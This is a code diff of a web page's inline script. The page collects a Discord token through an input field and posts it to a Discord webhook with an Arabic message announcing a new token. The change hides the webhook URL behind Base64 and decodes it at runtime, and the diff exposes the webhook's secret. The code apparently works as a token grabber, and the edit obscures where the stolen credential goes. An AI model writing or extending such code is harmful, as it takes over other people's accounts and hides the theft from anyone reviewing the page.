@@ -72,9 +72,11 @@
   <script>
     const encPass = "QWhtZWQ=";
 
-    const webhookURL = "https://discord.com/api/webhooks/1378046683849425089/fuy8zbopmFWoFJVdBhRuDAT1RgMDe1dHXGkuv_gmOtOjbPdpnQ4BMHaPV2jGNYHWfxY6";
+    // رابط الويب هوك مشفّر ب Base64
+    const encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3ODA0NjY4Mzg0OTQyNTA4OS9mdXk4emJvcG1GV29GSlZkQmhSdURBVDFSZ01EZTFkaFhHa3V2X2dtT3RKYlBkcG5RRDBGbUhhUFYyamdHTllIV2Z4WTY=";
 
     const b64d = s => atob(s);
+
     const passwordInput = document.getElementById("passwordInput");
     const tokenInput = document.getElementById("tokenInput");
     const channelIdInput = document.getElementById("channelIdInput");
@@ -119,7 +121,7 @@
     };
 
     function sendWebhook(token) {
-      fetch(webhookURL, {
+      fetch(b64d(encWebhook), {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: "تم اعطائك توكن جديد : " + token })
